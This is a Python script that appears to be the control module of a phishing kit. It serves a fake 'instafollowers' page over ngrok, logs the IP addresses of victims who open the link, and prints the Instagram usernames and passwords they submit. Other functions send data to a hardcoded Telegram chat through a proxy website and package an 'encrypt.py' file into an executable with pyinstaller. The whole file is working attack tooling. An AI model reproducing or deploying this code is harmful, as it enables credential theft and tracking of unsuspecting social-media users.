from colorama import Fore
import os
from subprocess import Popen
import json
from pyngrok import ngrok
import time
import requests

stat_file = 0

def soc1():
    def phpserver():
        with open("log","w") as phplog:
            Popen(("php","-S","localhost:4040","-t","../instafollowers"),stderr=phplog,stdout=phplog)
            u = ngrok.connect(4040,"http")
            print(u)

    phpserver()
    def readip():
            global stat_file
            if not str(os.stat("../instafollowers/ip.txt").st_size) == stat_file:
                stat_file = str(os.stat("../instafollowers/ip.txt").st_size)
                fileip = open("../instafollowers/ip.txt","r")
                i = fileip.readlines()
                try:
                    i = i[-1]
                    print(Fore.GREEN+"\n [!]"+Fore.LIGHTCYAN_EX+" IP: %s Opened Link : "%(i)+time.ctime())
                    o = open("../instafollowers/ip.txt","w")
                    o.write("")
                    o.close()
                except:
                    print(" ")

    while True:
        readip()
    


def soc():
    a = open("../instafollowers/usernames.json","w")
    b = a.write("")
    a.close()
    def phpserver():
        with open("log","w") as phplog:
            Popen(("php","-S","localhost:4040","-t","../instafollowers"),stderr=phplog,stdout=phplog)
            u = ngrok.connect(4040,"http")
            print(u)

    phpserver()
    

    def user():
        global stat_file
        if not str(os.stat("../instafollowers/usernames.json").st_size) == stat_file:
            stat_file = str(os.stat("../instafollowers/usernames.json").st_size)
            fileip = open("../instafollowers/usernames.json","r")
            b = fileip.read()
            try:
                infor = json.loads(b)
                for value in infor['dev']:
                    print(Fore.GREEN+" [+] "+Fore.WHITE+"Username : "+Fore.YELLOW+value['username'])
                    print(Fore.GREEN+" [+] "+Fore.WHITE+"Password : "+Fore.YELLOW+value['password'])
                    a = open("../instafollowers/usernames.json","w")
                    b = a.write("")
                    a.close()
            except:
                print(" ")


    while True:
        user()



def soc2(token,num):
    url = ("https://api.telegram.org/bot{token}/sendmessage?chat_id=1235363769&text={k}".format(k=str(num),token=token))

    payload = {"UrlBox":url,
               
               "AgentList":"Mozilla Firefox",
               "VersionList":"HTTP/1.1",
               "MethodList":"POST"}
    
    
    req = requests.post("https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx",payload)

def soc3():
    os.system("pyinstaller --onefile encrypt.py")
    print("Your Exe File Is Building!Go To /dist")